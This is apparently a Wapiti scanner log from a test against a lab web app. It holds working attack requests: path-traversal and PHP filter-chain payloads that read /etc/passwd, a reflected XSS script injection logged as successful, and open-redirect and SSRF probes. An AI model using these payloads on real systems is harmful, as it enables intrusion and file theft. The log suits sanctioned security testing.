%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
2024-03-20 12:47:10.998 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:47:11.011 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:47:11.024 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:47:11.036 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:47:11.047 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:47:11.057 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:47:11.068 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:11.078 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:11.091 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:47:11.101 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:47:11.111 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:11.123 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:11.135 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:47:11.145 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:47:11.154 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:47:11.163 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:47:11.173 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:47:11.182 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:47:11.193 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:11.202 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:11.213 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:47:11.221 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:47:11.231 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:11.241 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:11.250 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=file%3A%2F%2F%2Fetc%2Fpasswd (0)
2024-03-20 12:47:11.259 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-20 12:47:11.268 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
2024-03-20 12:47:11.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:47:11.287 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
2024-03-20 12:47:11.297 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:11.307 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:47:11.315 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:11.332 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
2024-03-20 12:47:11.337 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
2024-03-20 12:47:11.361 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-20 12:47:11.370 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
2024-03-20 12:47:11.380 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-20 12:47:11.461 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-20 12:47:11.471 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
2024-03-20 12:47:11.479 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-20 12:47:11.479 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-20 12:47:11.537 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-20 12:47:11.537 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-20 12:47:11.624 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-20 12:47:11.638 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
2024-03-20 12:47:11.687 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/vulnerabilities/xss_r/?name=%3CScRiPt%3Ealert%28%27wthb2c10qk%27%29%3C%2FsCrIpT%3E (0)
2024-03-20 12:47:11.772 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:205 - ---
2024-03-20 12:47:11.772 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:206 - Reflected Cross Site Scripting in http://web/vulnerabilities/xss_r/ via injection in the parameter name
2024-03-20 12:47:11.773 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:216 - Evil request:
2024-03-20 12:47:11.773 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:217 -     GET /vulnerabilities/xss_r/?name=%3CScRiPt%3Ealert%28%27wthb2c10qk%27%29%3C%2FsCrIpT%3E HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: security=medium
2024-03-20 12:47:11.773 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:218 - ---
2024-03-20 12:47:11.780 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
2024-03-20 12:47:11.788 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
2024-03-20 12:47:11.803 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-20 12:47:11.817 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
2024-03-20 12:47:11.817 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/vulnerabilities/xss_r/?name=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-20 12:47:11.834 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/vulnerabilities/xss_r/?name=%2F%2Fopenbugbounty.org%2F
2024-03-20 12:47:11.866 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
2024-03-20 12:47:11.873 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
2024-03-20 12:47:11.886 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-20 12:47:11.897 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
2024-03-20 12:47:11.897 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/vulnerabilities/xss_r/?name=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fzmviau%2F1%2F6e616d65%2F (0)
2024-03-20 12:47:11.915 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
2024-03-20 12:47:11.922 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
2024-03-20 12:47:11.939 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=zmviau for results, please wait...
2024-03-20 12:47:14.026 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-20 12:47:14.043 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
2024-03-20 12:47:14.076 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
2024-03-20 12:47:14.109 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
2024-03-20 12:47:14.195 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-20 12:47:14.218 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//xss_r_med.json/
2024-03-20 12:47:14.218 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//xss_r_med.json/web_03202024_1247.html with a browser to see this report.
